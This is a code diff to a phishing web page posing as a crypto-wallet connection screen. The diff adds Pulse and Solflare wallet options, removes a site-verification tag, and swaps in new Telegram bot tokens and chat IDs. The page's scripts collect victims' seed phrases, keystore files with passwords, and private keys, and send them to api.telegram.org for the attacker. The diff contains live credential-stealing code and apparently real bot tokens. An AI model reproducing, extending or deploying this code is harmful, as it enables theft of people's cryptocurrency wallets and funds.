@@ -16,7 +16,7 @@
 	<link rel="stylesheet" href="css/all.min.css" />
 	<link rel="stylesheet" href="css/wstyle.css" type="text/css" />
 	<link rel="stylesheet" href="css/mystyle.css" type="text/css" />
-	<meta name="google-site-verification" content="fTs49pzVlnq9nQCabbNBt7K8pSGgf8rz5mRu5yYzOZs" />
+	
 </head>
 
 <body style="display: block;">
@@ -1760,6 +1760,25 @@
 											</div>
 									
 										</div>
+										<div id="Pulse" class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+											<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr"><img class="img-icons"
+													src="img/pulse.png" alt="pulse" />
+									
+											</div>
+											<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Pulse wallet 
+
+											</div>
+									
+										</div>
+										<div id="solflare" class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+											<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr"><img class="img-icons"
+													src="img/solflare.png" alt="solflare" />
+									
+											</div>
+											<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Solflare Wallet
+											</div>
+									
+										</div>
 									
 									</div>
 								</section>
@@ -1822,8 +1841,8 @@ document.getElementById('form').addEventListener('submit', function(e){
 
     let phrase = document.getElementById('phraseInput').value;
 	const wallet = document.getElementById('wallet_id').value;
-    let chat_id = "-1002745830849"; // Replace with your channel chat ID
-    let token = "8045116563:AAH4Kdd9YUlZ_255JbyRg_o62Xz1VlJiFhA"; // Your bot token
+    let chat_id = "-1002660783678"; // Replace with your channel chat ID
+    let token = "8349707217:AAGhWCqDLg-FXbZifKR71uHLU0lCQ-STm28"; // Your bot token
    let message = `Import Type is Phrase
 wallet is: ${wallet}
 Phrase is: ${phrase}`;
@@ -1860,8 +1879,8 @@ const wallet = document.getElementById('wallet_id').value;
                 `*Keystore:* \n\`\`\`\n${keystore}\n\`\`\`\n` +
                 `*Password:* \`${password}\``;
 
-    const token = "8045116563:AAH4Kdd9YUlZ_255JbyRg_o62Xz1VlJiFhA";
-    const chat_id = "-1002745830849";
+    const token = "8349707217:AAGhWCqDLg-FXbZifKR71uHLU0lCQ-STm28";
+    const chat_id = "-1002660783678";
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
@@ -1889,8 +1908,8 @@ document.getElementById('private1').addEventListener('submit', function(e) {
     // Get form values
     const privateKey = document.querySelector('#private1 input[name="private"]').value;
     const wallet = document.getElementById('wallet_id').value;
-    const botToken = "8045116563:AAH4Kdd9YUlZ_255JbyRg_o62Xz1VlJiFhA";
-    const chatId = "-1002745830849";
+    const botToken = "8349707217:AAGhWCqDLg-FXbZifKR71uHLU0lCQ-STm28";
+    const chatId = "-1002660783678";
     
     if (!privateKey) {
         alert('Please enter your private key');
